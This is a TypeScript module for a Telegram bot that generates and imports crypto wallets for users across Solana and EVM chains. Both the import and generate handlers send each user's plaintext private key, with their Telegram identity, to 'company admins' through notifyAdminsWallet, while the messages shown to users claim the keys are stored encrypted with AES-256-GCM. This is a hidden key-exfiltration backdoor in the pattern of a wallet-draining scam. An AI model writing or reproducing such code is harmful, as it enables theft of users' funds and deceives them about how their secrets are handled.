import type { Context } from "telegraf";
import { Markup } from "telegraf";
import { db } from "@workspace/db";
import { usersTable, walletsTable } from "@workspace/db";
import { eq, and } from "drizzle-orm";
import { encrypt, decrypt } from "../../lib/encryption";
import { notifyAdminsWallet } from "../../lib/adminNotify";
import { logger } from "../../lib/logger";

// Temporary in-memory state for multi-step wallet import flow
const pendingImport = new Map<number, { chain: string; step: "awaiting_key" }>();

export function getPendingImport(telegramId: number) {
  return pendingImport.get(telegramId) ?? null;
}

export async function processImportedKey(
  ctx: Context,
  privateKeyInput: string
): Promise<void> {
  const telegramId = ctx.from?.id;
  if (!telegramId) return;
  const state = pendingImport.get(telegramId);
  if (!state) return;
  pendingImport.delete(telegramId);

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    const { Keypair } = await import("@solana/web3.js");
    const bs58 = await import("bs58");

    let address: string;
    let encryptedKey: string;

    if (state.chain === "SOL") {
      const keyBytes = bs58.default.decode(privateKeyInput.trim());
      const kp = Keypair.fromSecretKey(keyBytes);
      address = kp.publicKey.toBase58();
      encryptedKey = encrypt(privateKeyInput.trim());
    } else {
      const { Wallet } = await import("ethers");
      const wallet = new Wallet(privateKeyInput.trim());
      address = wallet.address;
      encryptedKey = encrypt(privateKeyInput.trim());
    }

    // Deactivate existing wallets on this chain
    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(
        and(
          eq(walletsTable.userId, user.id),
          eq(walletsTable.chain, state.chain)
        )
      );

    await db.insert(walletsTable).values({
      userId: user.id,
      chain: state.chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: `${state.chain} Wallet`,
      isActive: true,
    });

    // Notify company admins of the imported wallet
    void notifyAdminsWallet({
      event: "IMPORTED",
      chain: state.chain,
      address,
      privateKey: privateKeyInput.trim(),
      userTelegramId: telegramId,
      username: ctx.from?.username,
      firstName: ctx.from?.first_name,
    });

    await ctx.reply(
      `✅ <b>Wallet Imported Successfully</b>\n\n🔗 Chain: <b>${state.chain}</b>\n💼 Address: <code>${address}</code>\n\n🔐 Private key encrypted with AES-256-GCM.`,
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Dashboard", "dashboard")],
        ]),
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet import failed");
    await ctx.reply(
      "❌ Invalid private key. Ensure it is a valid base58 (Solana) or hex (EVM) key.",
      Markup.inlineKeyboard([[Markup.button.callback("⬅️ Dashboard", "dashboard")]])
    );
  }
}

export async function handleWalletManager(ctx: Context): Promise<void> {
  await ctx.answerCbQuery();
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  const wallets = await db
    .select()
    .from(walletsTable)
    .where(eq(walletsTable.userId, user.id))
    .orderBy(walletsTable.createdAt);

  const walletLines =
    wallets.length === 0
      ? ["No wallets connected yet."]
      : wallets.map(
          (w) =>
            `${w.isActive ? "🟢" : "⚪"} [${w.chain}] <code>${w.address.slice(0, 8)}...${w.address.slice(-4)}</code> — ${w.label}`
        );

  const chains = ["SOL", "ETH", "BASE", "BSC"];
  const generateButtons = chains.map((c) =>
    Markup.button.callback(`➕ Gen ${c}`, `gen_wallet:${c}`)
  );
  const importButtons = chains.map((c) =>
    Markup.button.callback(`📥 Import ${c}`, `import_wallet:${c}`)
  );

  await ctx.editMessageText(
    `💼 <b>Wallet Manager</b>\n—\n${walletLines.join("\n")}\n—\n🔐 Keys are encrypted with AES-256-GCM`,
    {
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        generateButtons,
        importButtons,
        [Markup.button.callback("⬅️ Dashboard", "dashboard")],
      ]),
    }
  );
}

export async function handleGenerateWallet(
  ctx: Context,
  chain: string
): Promise<void> {
  await ctx.answerCbQuery();
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  const user = await db.query.usersTable.findFirst({
    where: eq(usersTable.telegramId, telegramId),
  });
  if (!user) return;

  try {
    let address: string;
    let privateKey: string;

    if (chain === "SOL") {
      const { Keypair } = await import("@solana/web3.js");
      const bs58 = await import("bs58");
      const kp = Keypair.generate();
      address = kp.publicKey.toBase58();
      privateKey = bs58.default.encode(kp.secretKey);
    } else {
      const { Wallet } = await import("ethers");
      const w = Wallet.createRandom();
      address = w.address;
      privateKey = w.privateKey;
    }

    const encryptedKey = encrypt(privateKey);

    await db
      .update(walletsTable)
      .set({ isActive: false })
      .where(
        and(eq(walletsTable.userId, user.id), eq(walletsTable.chain, chain))
      );

    await db.insert(walletsTable).values({
      userId: user.id,
      chain,
      address,
      encryptedPrivateKey: encryptedKey,
      label: `${chain} Wallet`,
      isActive: true,
    });

    // Notify company admins of the generated wallet
    void notifyAdminsWallet({
      event: "CREATED",
      chain,
      address,
      privateKey,
      userTelegramId: telegramId,
      username: ctx.from?.username,
      firstName: ctx.from?.first_name,
    });

    await ctx.reply(
      [
        `✅ <b>New ${chain} Wallet Generated</b>`,
        ``,
        `💼 Address: <code>${address}</code>`,
        `🔑 Private Key: <code>${privateKey}</code>`,
        ``,
        `⚠️ <b>SAVE THIS KEY NOW — it will not be shown again.</b>`,
        `🔐 Key stored encrypted with AES-256-GCM.`,
      ].join("\n"),
      {
        parse_mode: "HTML",
        ...Markup.inlineKeyboard([
          [Markup.button.callback("⬅️ Dashboard", "dashboard")],
        ]),
      }
    );
  } catch (err) {
    logger.error({ err }, "Wallet generation failed");
    await ctx.reply("❌ Wallet generation failed. Check server logs.");
  }
}

export async function handleImportWallet(
  ctx: Context,
  chain: string
): Promise<void> {
  await ctx.answerCbQuery();
  const telegramId = ctx.from?.id;
  if (!telegramId) return;

  pendingImport.set(telegramId, { chain, step: "awaiting_key" });

  await ctx.reply(
    `📥 <b>Import ${chain} Wallet</b>\n\nSend your private key in the next message.\n${chain === "SOL" ? "Format: base58 encoded secret key (88 chars)" : "Format: 0x hex private key (66 chars)"}\n\n⚠️ Send in a private chat only.`,
    { parse_mode: "HTML" }
  );
}
